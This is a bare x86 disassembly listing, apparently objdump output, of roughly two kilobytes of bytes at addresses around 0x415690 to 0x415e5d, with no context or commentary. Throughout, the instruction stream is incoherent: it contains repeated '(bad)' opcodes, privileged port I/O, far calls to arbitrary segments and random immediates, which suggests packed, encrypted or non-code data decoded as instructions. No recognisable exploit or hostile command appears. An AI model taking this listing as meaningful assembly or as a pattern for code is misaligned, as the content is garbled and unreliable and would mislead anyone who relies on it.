  41568d:	sub    edi,esp
  41568f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415690:	stc    
  415691:	js     0x41570d
  415693:	pop    edx
  415694:	jbe    0x4156b7
  415696:	push   sp
  415698:	cmp    al,0x94
  41569a:	(bad)  
  41569b:	mov    ch,0x71
  41569d:	mov    ds:0xbb8f390,eax
  4156a2:	pop    edi
  4156a3:	cmp    eax,0x2b9b99b
  4156a8:	sub    al,0x26
  4156aa:	sbb    dh,dl
  4156ac:	js     0x4156de
  4156ae:	stos   BYTE PTR es:[edi],al
  4156af:	jbe    0x41571c
  4156b1:	dec    ecx
  4156b2:	stos   BYTE PTR es:[edi],al
  4156b3:	lahf   
  4156b4:	and    edi,ecx
  4156b6:	mov    BYTE PTR [eax+ebx*8],al
  4156b9:	ins    BYTE PTR es:[edi],dx
  4156ba:	adc    DWORD PTR [edi+edx*2],0x52
  4156be:	mov    edi,0x56ec9cfe
  4156c3:	mov    eax,ds:0x66d0d5ab
  4156c8:	pusha  
  4156c9:	lahf   
  4156ca:	aaa    
  4156cb:	mov    cs,WORD PTR [edx-0x2f]
  4156ce:	arpl   bx,di
  4156d0:	loop   0x4156fe
  4156d2:	aad    0x2c
  4156d4:	sub    eax,0xe7521765
  4156d9:	inc    edi
  4156da:	inc    ecx
  4156db:	bound  edi,QWORD PTR [eax+0x3991e0ce]
  4156e1:	lds    edx,FWORD PTR [eax-0x28]
  4156e4:	test   BYTE PTR [edx],bh
  4156e6:	inc    ecx
  4156e7:	pop    ecx
  4156e8:	jp     0x41569d
  4156ea:	call   0x7f01:0xa59d4261
  4156f1:	in     al,dx
  4156f2:	mov    ah,0xc7
  4156f4:	inc    edi
  4156f5:	gs ret 
  4156f7:	or     BYTE PTR [esi],0xaf
  4156fa:	out    dx,eax
  4156fb:	imul   ecx,DWORD PTR [esi-0x25df7628],0xffffffa5
  415702:	gs pop ebx
  415704:	cmp    BYTE PTR [ebx+0x5c2cc482],dl
  41570a:	aad    0x3
  41570c:	enter  0x72cc,0x9e
  415710:	sub    al,BYTE PTR [edi]
  415712:	pop    edi
  415713:	mov    ds:0x620353fe,al
  415718:	sbb    eax,0x4660da01
  41571d:	in     al,0xd0
  41571f:	bnd jae 0x415763
  415722:	retf   
  415723:	clc    
  415724:	mov    edx,0x5d845ddb
  415729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41572a:	inc    eax
  41572b:	icebp  
  41572c:	mov    ?,WORD PTR [ebx+eiz*4+0x234903a2]
  415733:	std    
  415734:	loopne 0x4157a4
  415736:	out    dx,eax
  415737:	shr    BYTE PTR [eax],cl
  415739:	pop    esi
  41573a:	sbb    al,0x79
  41573c:	lea    ebx,[edi+0x11]
  41573f:	inc    edx
  415740:	sub    eax,0xc2c58621
  415745:	xor    cl,BYTE PTR [ebp+0x3ae1a0a2]
  41574b:	cmp    esp,ebp
  41574d:	mov    edx,0x7e24d0b
  415752:	sbb    esp,DWORD PTR [esi]
  415754:	sbb    BYTE PTR [edx-0x25c71ef4],0x9a
  41575b:	and    al,0x7a
  41575d:	jecxz  0x415778
  41575f:	xchg   ecx,eax
  415760:	scas   eax,DWORD PTR es:[edi]
  415761:	jmp    0x4156e9
  415763:	sti    
  415764:	lods   al,BYTE PTR ds:[esi]
  415765:	mov    edx,0x135ae3a7
  41576a:	and    DWORD PTR [edx*2+0x60a1cab5],eax
  415771:	adc    DWORD PTR [ebx],esp
  415773:	xor    dl,0x6c
  415776:	imul   ecx,ebp,0x6caa0791
  41577c:	xor    al,0x2b
  41577e:	(bad)  
  41577f:	or     edx,DWORD PTR ds:0xe8016412
  415785:	vaddps ymm3,ymm2,YMMWORD PTR [esi-0x58]
  41578a:	mov    ah,0x0
  41578c:	stos   DWORD PTR es:[edi],eax
  41578d:	and    BYTE PTR [edx+0x12],bh
  415790:	xor    DWORD PTR [eax],0x97357ae2
  415796:	xor    al,0x61
  415798:	mov    edx,0x4df6f118
  41579d:	or     ch,dh
  41579f:	out    dx,eax
  4157a0:	jnp    0x415765
  4157a2:	out    dx,al
  4157a3:	and    DWORD PTR [ebx+0x7],0x86360ab1
  4157aa:	shl    dh,0x75
  4157ad:	and    al,0xb8
  4157af:	shl    DWORD PTR [edi+0x4f],0x8
  4157b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157b4:	in     eax,0x84
  4157b6:	push   ebp
  4157b7:	push   edx
  4157b8:	cmp    eax,DWORD PTR [ebx+0x35099c3]
  4157be:	xor    ebp,edx
  4157c0:	mov    al,ds:0x371c53d2
  4157c5:	or     eax,0x64ad6f5f
  4157ca:	test   DWORD PTR [edx-0x66f03a34],eax
  4157d0:	mov    ss,WORD PTR [edi]
  4157d2:	dec    ecx
  4157d3:	or     DWORD PTR [ecx],ebx
  4157d5:	xlat   BYTE PTR ds:[ebx]
  4157d6:	pop    ecx
  4157d7:	dec    esi
  4157d8:	(bad)  
  4157d9:	cmp    eax,0x23206a39
  4157de:	and    al,0xe7
  4157e0:	pop    edi
  4157e1:	cmp    al,0x77
  4157e3:	push   ebp
  4157e4:	or     eax,0xc2d6f897
  4157e9:	mov    dh,0x26
  4157eb:	out    0x87,al
  4157ed:	cmp    eax,0xdcad292b
  4157f2:	ret    
  4157f3:	test   al,0x31
  4157f5:	mov    eax,ds:0xbff66b39
  4157fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157fb:	sub    al,0x23
  4157fd:	sub    dl,BYTE PTR cs:[esi]
  415800:	fwait
  415801:	xor    edx,0x312a6ae6
  415807:	repnz push cs
  415809:	(bad)  
  41580a:	jns    0x415837
  41580c:	in     al,0x95
  41580e:	test   BYTE PTR [edi],0xa8
  415811:	fiadd  DWORD PTR [ebp+0x3c002873]
  415817:	adc    al,0x31
  415819:	or     al,0xa9
  41581b:	sub    esp,DWORD PTR [ebx+0xe]
  41581e:	adc    ebx,eax
  415820:	fstp   QWORD PTR [esi-0x35]
  415823:	leave  
  415824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415825:	xchg   ebp,eax
  415826:	push   edx
  415827:	nop
  415828:	test   esp,ebx
  41582a:	clc    
  41582b:	pop    eax
  41582c:	or     DWORD PTR [edi],edx
  41582e:	(bad)  
  415830:	xchg   esi,eax
  415831:	lods   eax,DWORD PTR ds:[esi]
  415832:	gs cmp bl,dl
  415835:	rcr    DWORD PTR ds:0x10741454,cl
  41583b:	mov    edi,0xf5c7751a
  415840:	jle    0x4158bd
  415842:	xlat   BYTE PTR ds:[ebx]
  415843:	test   al,0x7b
  415845:	jp     0x4158b5
  415847:	mov    ecx,0x566df518
  41584c:	mov    al,0x25
  41584e:	ret    
  41584f:	add    al,0xf2
  415851:	ficomp DWORD PTR [eax+0x7a]
  415855:	outs   dx,DWORD PTR ds:[esi]
  415856:	out    dx,eax
  415857:	xor    DWORD PTR [esi+ebx*8-0x74],ebx
  41585b:	sar    dl,cl
  41585d:	jg     0x415888
  41585f:	jbe    0x415841
  415861:	xchg   esi,eax
  415862:	or     esp,DWORD PTR [eax-0x297d5184]
  415868:	jecxz  0x41586f
  41586a:	inc    eax
  41586b:	sub    DWORD PTR [ebp+0x78a05b33],ebp
  415871:	call   0xa615396b
  415876:	dec    esi
  415877:	xchg   ebp,eax
  415878:	nop
  415879:	call   0xc4a524dd
  41587e:	dec    ebp
  41587f:	in     eax,0x65
  415881:	icebp  
  415882:	push   esi
  415883:	add    BYTE PTR [ecx-0x63f2b27e],ah
  415889:	inc    esp
  41588a:	fcmove st,st(1)
  41588c:	mov    WORD PTR [ebx-0x2f],gs
  41588f:	pop    ds
  415890:	fild   DWORD PTR [ecx-0x4e]
  415893:	sbb    al,0xc9
  415895:	jne    0x41588a
  415897:	(bad)  
  415898:	push   ebx
  415899:	mov    al,0xba
  41589b:	jle    0x4158b0
  41589d:	fsubp  st(3),st
  41589f:	mov    ah,0x50
  4158a1:	xchg   BYTE PTR [ecx+0x67],ch
  4158a4:	out    0x86,eax
  4158a6:	push   esp
  4158a7:	cli    
  4158a8:	push   edi
  4158a9:	dec    ebp
  4158aa:	add    DWORD PTR [ecx-0x32],0xffffff9b
  4158ae:	inc    edi
  4158af:	(bad)  
  4158b0:	data16 mov dh,0x4b
  4158b3:	call   0xff9b:0x23fb0642
  4158ba:	fsubrp st(1),st
  4158bc:	aas    
  4158bd:	fstp   TBYTE PTR [edi]
  4158bf:	aam    0xac
  4158c1:	nop
  4158c2:	sub    DWORD PTR [ebp-0x5f],edx
  4158c5:	ds mov al,0x92
  4158c8:	mov    ebp,0xfdf7ab0d
  4158cd:	push   cs
  4158ce:	lods   eax,DWORD PTR ds:[esi]
  4158cf:	int    0xfa
  4158d1:	dec    ebp
  4158d2:	out    dx,eax
  4158d3:	leave  
  4158d4:	inc    ecx
  4158d5:	pop    ds
  4158d6:	pop    esi
  4158d7:	out    dx,al
  4158d8:	sahf   
  4158d9:	cdq    
  4158da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158db:	out    0x48,eax
  4158dd:	call   0x70f2:0xfccfd1a8
  4158e4:	ret    
  4158e5:	loopne 0x415963
  4158e7:	inc    esp
  4158e8:	jp     0x41595d
  4158ea:	call   0xc86e433
  4158ef:	and    edi,edx
  4158f1:	jmp    0x415e03
  4158f6:	aas    
  4158f7:	ret    0x3dce
  4158fa:	rcl    ecx,1
  4158fc:	iret   
  4158fd:	ret    0x3f53
  415900:	dec    ecx
  415901:	xchg   esi,eax
  415902:	sub    eax,0x8a19073a
  415907:	xor    eax,0x7c73787f
  41590c:	js     0x415986
  41590e:	repz xor BYTE PTR [ebp+esi*2-0x4808b086],bh
  415916:	sub    BYTE PTR [ecx+0x24aeab7d],bl
  41591c:	shl    ah,0x64
  41591f:	(bad)  
  415921:	in     al,dx
  415922:	xor    bh,bl
  415924:	cmp    BYTE PTR [edx-0x25],0x38
  415928:	jnp    0x415926
  41592a:	in     al,dx
  41592b:	mov    al,BYTE PTR [edx-0x179dc41a]
  415931:	call   0x656b:0xfbd7e3af
  415938:	and    DWORD PTR [esi+ecx*8+0x4e2d2bc7],ebp
  41593f:	mov    ebx,?
  415941:	iret   
  415942:	rcl    ecx,0x99
  415945:	retf   
  415946:	push   es
  415947:	xchg   DWORD PTR [eax+0x22213fc],edi
  41594d:	sbb    ch,BYTE PTR [esp+edi*8+0x12]
  415951:	jecxz  0x415993
  415953:	or     eax,0xd3c79136
  415958:	mov    ds:0xf0d26bae,al
  41595d:	dec    ecx
  41595e:	inc    esi
  41595f:	jb     0x415968
  415961:	ss push esp
  415963:	jo     0x415913
  415965:	int3   
  415966:	mov    ebx,0x66d0c673
  41596b:	cdq    
  41596c:	add    esp,ebp
  41596e:	sbb    DWORD PTR [ebx+0x0],ebx
  415971:	xor    ebx,DWORD PTR [ebx+0x75]
  415974:	adc    DWORD PTR [ebx+0x4a],esi
  415977:	adc    BYTE PTR [esi],bl
  415979:	stos   DWORD PTR es:[edi],eax
  41597a:	inc    ecx
  41597b:	mov    ecx,0xd4c07809
  415980:	pop    ebx
  415981:	pop    ecx
  415982:	scas   al,BYTE PTR es:[edi]
  415983:	xor    BYTE PTR [ecx+0x47],al
  415986:	and    bh,BYTE PTR [ebp+0x21]
  415989:	push   esp
  41598a:	jb     0x415997
  41598c:	mov    esp,0x791e4bf7
  415991:	and    ah,BYTE PTR ds:0x78d37277
  415997:	sbb    DWORD PTR ds:0x45dd7d75,ebp
  41599d:	call   0x8bc4:0xe6ce6883
  4159a4:	jo     0x41598a
  4159a6:	push   ds
  4159a7:	sbb    eax,0x3328415a
  4159ac:	or     dl,BYTE PTR [eax-0x50a76e5a]
  4159b2:	fisub  WORD PTR [eax-0x30]
  4159b5:	cmc    
  4159b6:	inc    BYTE PTR [edi-0x2a]
  4159b9:	pop    ss
  4159ba:	pushf  
  4159bb:	dec    ebp
  4159bc:	mov    dl,0xcb
  4159be:	(bad)  
  4159bf:	ja     0x4159c8
  4159c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159c2:	bound  ecx,QWORD PTR [ebp+0x6c]
  4159c5:	rol    bh,0xa2
  4159c8:	xchg   ebx,eax
  4159c9:	xchg   esi,eax
  4159ca:	pop    ds
  4159cb:	mov    dh,0x28
  4159cd:	push   es
  4159ce:	repz clc 
  4159d0:	xchg   edi,eax
  4159d1:	lock fcmovnbe st,st(0)
  4159d4:	inc    ebx
  4159d5:	add    ebp,DWORD PTR [edx-0x4c]
  4159d8:	pop    ds
  4159d9:	in     eax,0x32
  4159db:	jl     0x4159d8
  4159dd:	cmp    edi,0x14
  4159e0:	mov    edi,esp
  4159e2:	adc    DWORD PTR [eax],edi
  4159e4:	and    cl,al
  4159e6:	out    0x57,al
  4159e8:	sub    bh,BYTE PTR [ecx-0x31]
  4159eb:	mov    DWORD PTR [edi-0x5f88983f],eax
  4159f1:	xor    DWORD PTR ds:0x67a3c312,0xffffffb2
  4159f8:	loope  0x4159aa
  4159fa:	xor    al,0x7
  4159fc:	mov    cl,0x2b
  4159fe:	test   esp,edx
  415a00:	in     eax,dx
  415a01:	test   esi,edx
  415a03:	and    eax,0xf8e4202c
  415a08:	jg     0x415a55
  415a0a:	xor    eax,0xc31949c3
  415a0f:	cs mov ch,0x9e
  415a12:	call   0x7fb4:0x573ecc05
  415a19:	or     bl,BYTE PTR [edi]
  415a1b:	pop    ebp
  415a1c:	mov    edi,0xb333c840
  415a21:	push   edx
  415a22:	sti    
  415a23:	inc    edx
  415a24:	pop    ss
  415a25:	add    BYTE PTR [ebp+ebx*2-0x61],dl
  415a29:	int    0x9b
  415a2b:	retf   
  415a2c:	cmp    edx,DWORD PTR [edi-0x35]
  415a2f:	je     0x4159b3
  415a31:	add    BYTE PTR [ecx+0x5c],ch
  415a34:	add    ebp,ebp
  415a36:	ror    BYTE PTR [ebp-0x7a],cl
  415a39:	xchg   ebp,eax
  415a3a:	cdq    
  415a3b:	adc    DWORD PTR [edi],0xa
  415a3e:	mov    dl,0x5b
  415a40:	mov    al,0xa0
  415a42:	sbb    edx,DWORD PTR [edx-0x34cbb26e]
  415a48:	add    dl,BYTE PTR [ecx+0x36]
  415a4b:	not    bh
  415a4d:	jne    0x415a6b
  415a4f:	xchg   BYTE PTR [ebx-0x3f231b14],al
  415a55:	mov    eax,ds:0x12ffe3de
  415a5a:	adc    DWORD PTR [esi-0xef5eef6],esp
  415a60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a61:	out    dx,eax
  415a62:	push   ebx
  415a63:	shr    DWORD PTR [ecx+0x8960a2f],0x19
  415a6a:	repz popaw 
  415a6d:	adc    edi,DWORD PTR [ebx+0xfab9d5b]
  415a73:	mov    bh,0x5f
  415a75:	pusha  
  415a76:	(bad)  
  415a77:	cmp    esp,DWORD PTR ds:0x7909ffb
  415a7d:	or     eax,0x98677547
  415a82:	ja     0x415a73
  415a84:	lahf   
  415a85:	and    ebp,DWORD PTR [ecx+0x5277ba58]
  415a8b:	ror    BYTE PTR [ebp+0x5479136e],1
  415a91:	(bad)  
  415a92:	fldenv ss:[eax]
  415a95:	mov    esi,DWORD PTR [edi-0x40]
  415a98:	dec    ebx
  415a99:	mov    bl,0x3
  415a9b:	test   BYTE PTR [edx],0x2e
  415a9e:	mov    esp,0x34b795f9
  415aa3:	jle    0x415a7c
  415aa5:	ins    DWORD PTR es:[edi],dx
  415aa6:	cmp    eax,0x7c1a4b40
  415aab:	fs push ecx
  415aad:	data16 xchg BYTE PTR [ebx],ch
  415ab0:	dec    edx
  415ab1:	mov    eax,0xfb4c0811
  415ab6:	push   eax
  415ab7:	inc    ebp
  415ab8:	int3   
  415ab9:	sub    eax,DWORD PTR [ecx+0x4b6d663b]
  415abf:	sahf   
  415ac0:	sbb    BYTE PTR [ebp-0x4306b77],ch
  415ac6:	mov    DWORD PTR [ecx+0x7987724b],eax
  415acc:	dec    edx
  415acd:	sub    bh,BYTE PTR [edx+0x65a37450]
  415ad3:	sbb    bh,BYTE PTR [ebx-0x48]
  415ad6:	aaa    
  415ad7:	in     eax,0xb3
  415ad9:	mov    eax,0xd7e8778d
  415ade:	aaa    
  415adf:	mov    eax,0x4548469f
  415ae4:	jbe    0x415adb
  415ae6:	mov    cl,0x9f
  415ae8:	push   ds
  415ae9:	repnz and edx,ebp
  415aec:	ss ret 0x55ed
  415af0:	lahf   
  415af1:	mov    al,dl
  415af3:	(bad)  [ecx]
  415af5:	in     al,0xa0
  415af7:	cmc    
  415af8:	cwde   
  415af9:	aas    
  415afa:	pusha  
  415afb:	xchg   ebx,eax
  415afc:	add    al,0xbb
  415afe:	fnstsw WORD PTR [ebx-0x49]
  415b01:	ret    
  415b02:	into   
  415b03:	scas   eax,DWORD PTR es:[edi]
  415b04:	in     al,dx
  415b05:	rcr    DWORD PTR [edx],cl
  415b07:	jae    0x415b0a
  415b09:	mov    dl,0xed
  415b0b:	cmp    DWORD PTR [ecx-0x1d],ebp
  415b0e:	xchg   edx,eax
  415b0f:	aas    
  415b10:	dec    edx
  415b11:	dec    ecx
  415b12:	mov    edi,0xfa77e755
  415b17:	std    
  415b18:	js     0x415b1b
  415b1a:	xchg   ebx,eax
  415b1b:	dec    ebx
  415b1c:	xchg   esi,eax
  415b1d:	jmp    0x415b8b
  415b1f:	inc    eax
  415b20:	fbstp  TBYTE PTR [eax+0x2a]
  415b23:	push   0x6d562bf9
  415b28:	loope  0x415b1f
  415b2a:	out    0xa8,eax
  415b2c:	adc    DWORD PTR [esi-0x9],0xffffff82
  415b30:	mov    edx,0x8a21a356
  415b35:	inc    esp
  415b36:	popa   
  415b37:	shl    edx,1
  415b39:	adc    eax,0xefc6fc8c
  415b3e:	or     ah,BYTE PTR [edi+eiz*8+0x3c7357b3]
  415b45:	mov    esi,0xe8d5875f
  415b4a:	(bad)
  415b4d:	push   ecx
  415b4e:	call   0xd27a:0x73500053
  415b55:	lds    eax,FWORD PTR [ebx]
  415b57:	(bad)  
  415b58:	out    dx,al
  415b59:	sbb    bh,cl
  415b5b:	pusha  
  415b5c:	sti    
  415b5d:	inc    edi
  415b5e:	lods   al,BYTE PTR ds:[esi]
  415b5f:	xchg   edi,ecx
  415b61:	cwde   
  415b62:	imul   eax,DWORD PTR [eax],0x5f
  415b65:	mov    esp,0x1ab51d5c
  415b6a:	sbb    al,0x5f
  415b6c:	nop
  415b6d:	pop    esi
  415b6e:	std    
  415b6f:	sbb    eax,0x1f6d2a38
  415b74:	xchg   ebx,eax
  415b75:	loopne 0x415b84
  415b77:	fldln2 
  415b79:	les    esi,FWORD PTR [ebx-0x18]
  415b7c:	push   0xfffffffd
  415b7e:	sub    al,0x48
  415b80:	xor    BYTE PTR [ecx],0x5f
  415b83:	outs   dx,DWORD PTR ds:[esi]
  415b84:	cdq    
  415b85:	xor    BYTE PTR [esi],al
  415b87:	mov    al,ds:0xc495d3ca
  415b8c:	ja     0x415b73
  415b8e:	pushf  
  415b8f:	out    0xc,al
  415b91:	xchg   esi,eax
  415b92:	dec    ebx
  415b93:	inc    ebx
  415b94:	inc    edx
  415b95:	cmp    ecx,ebp
  415b97:	frstor [edx-0xa8961f3]
  415b9d:	sbb    eax,0xc99f0e83
  415ba2:	jae    0x415b87
  415ba4:	iret   
  415ba5:	into   
  415ba6:	das    
  415ba7:	xlat   BYTE PTR ds:[ebx]
  415ba8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ba9:	pushf  
  415baa:	mov    ds:0xd9d8edd3,eax
  415baf:	hlt    
  415bb0:	leave  
  415bb1:	loopne 0x415b60
  415bb3:	jnp    0x415bac
  415bb5:	xor    DWORD PTR [edx+0x50cf5005],0x2b
  415bbc:	int3   
  415bbd:	enter  0x9d1b,0x66
  415bc1:	or     DWORD PTR [ebx+eax*8+0x71],esp
  415bc5:	mov    ch,0xb6
  415bc7:	sub    edx,DWORD PTR [ebp+0x24]
  415bca:	or     DWORD PTR [edx+0x4c],0x36
  415bce:	jmp    0x415bf9
  415bd0:	mov    dh,0xbb
  415bd2:	jbe    0x415bad
  415bd4:	lock jmp 0x2cf3:0x772675c9
  415bdc:	fdiv   QWORD PTR [edi]
  415bde:	in     eax,dx
  415bdf:	addr16 hlt 
  415be1:	fisttp QWORD PTR [edi]
  415be3:	add    eax,0x5a9382eb
  415be8:	dec    ebp
  415be9:	test   eax,0x45eb5e07
  415bee:	cmp    edx,ebx
  415bf0:	mov    bh,0xdf
  415bf2:	fldcw  WORD PTR [ecx+0x2b]
  415bf5:	fistp  QWORD PTR [ebp+eax*8-0x6b]
  415bf9:	add    DWORD PTR [esi+0x39],eax
  415bfc:	div    BYTE PTR [eax-0x499e4d89]
  415c02:	rcl    BYTE PTR [ecx-0x42dcea19],0x1f
  415c09:	cli    
  415c0a:	push   cs
  415c0b:	fdiv   QWORD PTR [edx+0x6]
  415c0e:	cmp    bh,BYTE PTR ds:0x6ad05f24
  415c14:	xchg   esi,eax
  415c15:	mov    edi,0x9f1bb4e1
  415c1a:	or     al,0x78
  415c1c:	icebp  
  415c1d:	adc    ah,al
  415c1f:	call   0xe677:0x1152bf54
  415c26:	cmp    al,0x32
  415c28:	les    edi,FWORD PTR fs:[ecx+0x643b1fea]
  415c2f:	pop    esp
  415c30:	test   BYTE PTR [ebx-0x7b],dh
  415c33:	adc    dl,bh
  415c35:	test   edi,ebx
  415c37:	dec    esp
  415c38:	and    eax,0x3c8a2098
  415c3d:	sbb    ch,BYTE PTR [ebx+eax*4+0x7ab2874]
  415c44:	jge    0x415c88
  415c46:	pusha  
  415c47:	ins    BYTE PTR es:[edi],dx
  415c48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c49:	in     eax,0x66
  415c4b:	in     eax,dx
  415c4c:	dec    ecx
  415c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c4e:	jno    0x53c9805c
  415c54:	dec    esp
  415c55:	dec    ecx
  415c56:	cmp    ebp,ecx
  415c58:	fsub   DWORD PTR ds:0x729d7aba
  415c5e:	jmp    0x122e:0x1438022f
  415c65:	or     ah,BYTE PTR [edx]
  415c67:	gs (bad) 
  415c69:	stc    
  415c6a:	jno    0x415cc8
  415c6c:	imul   edx,DWORD PTR [eax],0x632a48b
  415c72:	mov    esp,0x4b2eef80
  415c77:	jnp    0x415c16
  415c79:	or     dl,BYTE PTR [edx+0x53b8584d]
  415c7f:	sub    ebx,DWORD PTR [ebp-0x13c59f39]
  415c85:	adc    eax,0x43675858
  415c8a:	xor    DWORD PTR [edi-0x5817eed1],ebp
  415c90:	test   eax,0xb05ded60
  415c95:	add    DWORD PTR [ebp-0x35a88d54],esi
  415c9b:	inc    ebx
  415c9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c9d:	add    dl,BYTE PTR [edi+0x2a576e6f]
  415ca3:	outs   dx,DWORD PTR ds:[esi]
  415ca4:	mov    cl,0x99
  415ca6:	imul   si,WORD PTR [edi],0xffda
  415caa:	xor    DWORD PTR [eax-0x35784cfa],edi
  415cb0:	icebp  
  415cb1:	(bad)  [edi+0x1739f303]
  415cb7:	ret    
  415cb8:	pop    es
  415cb9:	or     ebx,edi
  415cbb:	mov    ds:0xb70ccf8e,al
  415cc0:	div    DWORD PTR [esp+ebp*4]
  415cc3:	mov    edx,0xd7fc5517
  415cc8:	dec    esp
  415cc9:	mov    dh,0xbc
  415ccb:	call   0x630e4dc9
  415cd0:	push   eax
  415cd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cd2:	in     eax,dx
  415cd3:	std    
  415cd4:	fsub   QWORD PTR ds:0xe29fec9d
  415cda:	jmp    0x766e2371
  415cdf:	pop    ecx
  415ce0:	loope  0x415d61
  415ce2:	xchg   ebp,eax
  415ce3:	push   ebp
  415ce4:	nop
  415ce5:	in     eax,0xa
  415ce7:	jg     0x415d5a
  415ce9:	and    eax,0xc20dd724
  415cee:	cwde   
  415cef:	dec    eax
  415cf0:	(bad)  
  415cf1:	neg    edx
  415cf3:	mov    edx,0x3c4e475c
  415cf8:	div    BYTE PTR [ecx]
  415cfa:	sub    ebp,DWORD PTR [esp+eax*1]
  415cfd:	mov    esi,0x6ee19905
  415d02:	sbb    al,0xdf
  415d04:	adc    DWORD PTR [ebx+0x6],ecx
  415d07:	xchg   ebx,eax
  415d08:	(bad)
  415d0c:	loopne 0x415d3a
  415d0e:	popf   
  415d0f:	push   ds
  415d10:	les    esp,FWORD PTR [edi-0x247ff0d5]
  415d16:	push   ds
  415d17:	mov    ebp,0x805926
  415d1c:	xchg   ebp,eax
  415d1d:	push   edx
  415d1e:	adc    eax,DWORD PTR [ebp+0x4df4fc9b]
  415d24:	push   ebp
  415d25:	adc    DWORD PTR [ecx+0x23e881ce],esi
  415d2b:	std    
  415d2c:	push   es
  415d2d:	mov    cl,0x26
  415d2f:	dec    edi
  415d30:	adc    BYTE PTR [ebx-0x44c49e49],al
  415d36:	shl    DWORD PTR [ecx-0x7b],1
  415d39:	mov    bl,0xca
  415d3b:	cmp    edx,DWORD PTR [ecx+0x77040ec3]
  415d41:	nop
  415d42:	push   edx
  415d43:	adc    al,0xff
  415d45:	pop    ebp
  415d46:	add    ebx,eax
  415d48:	lea    esi,[esi-0x33]
  415d4b:	je     0x415d7d
  415d4d:	scas   al,BYTE PTR es:[edi]
  415d4e:	xchg   ecx,eax
  415d4f:	jge    0x415cd1
  415d51:	mov    eax,ds:0xbc935a23
  415d56:	js     0x415d7c
  415d58:	fcmovnu st,st(4)
  415d5a:	aad    0x29
  415d5c:	repz jmp FWORD PTR [ecx]
  415d5f:	fucomip st,st(7)
  415d61:	inc    ebx
  415d62:	les    esi,FWORD PTR cs:[ebp+esi*1-0x27]
  415d67:	or     DWORD PTR [eax+0x36],esi
  415d6a:	arpl   dx,dx
  415d6c:	inc    ebp
  415d6d:	cli    
  415d6e:	aam    0x98
  415d70:	cld    
  415d71:	or     DWORD PTR [esi+eax*8],edi
  415d74:	out    dx,eax
  415d75:	scas   al,BYTE PTR es:[edi]
  415d76:	push   es
  415d77:	dec    eax
  415d78:	retf   
  415d79:	sub    DWORD PTR [eax],ecx
  415d7b:	sub    BYTE PTR [eax],ch
  415d7d:	mov    ds:0xb339e0ed,eax
  415d82:	stos   BYTE PTR es:[edi],al
  415d83:	mov    esp,0xe2b6ce91
  415d88:	aam    0x17
  415d8a:	call   0x10e7:0x443726e0
  415d91:	(bad)  
  415d93:	ins    DWORD PTR es:[edi],dx
  415d94:	mov    eax,ds:0x748b67b5
  415d99:	(bad)
  415d9d:	fcmovb st,st(0)
  415d9f:	dec    eax
  415da0:	dec    edx
  415da1:	cmp    BYTE PTR [eax-0x2147bbdf],ah
  415da7:	out    dx,al
  415da8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415da9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415daa:	push   ss
  415dab:	daa    
  415dac:	mov    al,ds:0x7606c163
  415db1:	test   BYTE PTR [eax+ecx*2-0x40],al
  415db5:	jle    0x415d5c
  415db7:	jge    0x415d5e
  415db9:	test   DWORD PTR [ebp+0x43],eax
  415dbc:	pop    edx
  415dbd:	mov    bl,0xe6
  415dbf:	xchg   DWORD PTR [edi-0x28],ecx
  415dc2:	gs push 0x2a29d7b3
  415dc8:	adc    DWORD PTR [esi],eax
  415dca:	test   al,0x85
  415dcc:	fadd   DWORD PTR [esi]
  415dce:	jecxz  0x415da4
  415dd0:	in     al,dx
  415dd1:	test   DWORD PTR [ecx+0x3d],0x8c189fed
  415dd8:	pop    esp
  415dd9:	pusha  
  415dda:	addr16 xchg ebp,eax
  415ddc:	enter  0x6c6f,0x21
  415de0:	push   eax
  415de1:	mov    edx,0xaf232a38
  415de6:	dec    ebp
  415de7:	fild   DWORD PTR [edi]
  415de9:	push   edx
  415dea:	(bad)  
  415deb:	pop    ebp
  415dec:	push   cs
  415ded:	cmp    eax,0x77166183
  415df2:	xchg   edx,eax
  415df3:	jmp    0x9dad:0x5f5cc37f
  415dfa:	fldcw  WORD PTR [eax]
  415dfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dfd:	fisttp DWORD PTR [ecx]
  415dff:	aad    0x93
  415e01:	mov    ah,0x71
  415e03:	mov    DWORD PTR [ebp-0x10],eax
  415e06:	sub    ecx,ecx
  415e08:	mov    eax,DWORD PTR [ebp+0x8]
  415e0b:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  415e12:	jmp    0x416324
  415e17:	cmp    al,0xd2
  415e19:	retf   
  415e1a:	rcr    ecx,0xd9
  415e1d:	retf   0x8d1
  415e20:	iret   
  415e21:	adc    eax,0x87d43525
  415e26:	ins    BYTE PTR es:[edi],dx
  415e27:	std    
  415e28:	cmp    BYTE PTR [edi+0x78],bh
  415e2b:	jae    0x415ea9
  415e2d:	js     0x415ea7
  415e2f:	or     eax,esp
  415e31:	inc    ecx
  415e32:	xchg   edx,eax
  415e33:	nop
  415e34:	jnp    0x415dd6
  415e36:	shl    BYTE PTR [ebx],1
  415e38:	inc    edi
  415e39:	xlat   BYTE PTR ds:[ebx]
  415e3a:	cmp    eax,esp
  415e3c:	sbb    DWORD PTR [ecx-0x1b],ecx
  415e3f:	pushf  
  415e40:	jmp    0x415e01
  415e42:	mov    dh,0x24
  415e44:	pop    edx
  415e45:	xchg   edx,eax
  415e46:	xchg   BYTE PTR [eax-0x68],bh
  415e49:	lock mov esp,0x5a15d0b9
  415e4f:	xor    BYTE PTR ds:0xf71d8505,ch
  415e55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e56:	push   ebp
  415e57:	mov    ch,0xa
  415e59:	sub    eax,ebx
  415e5b:	jge    0x415ec0
  415e5d:	pop    es
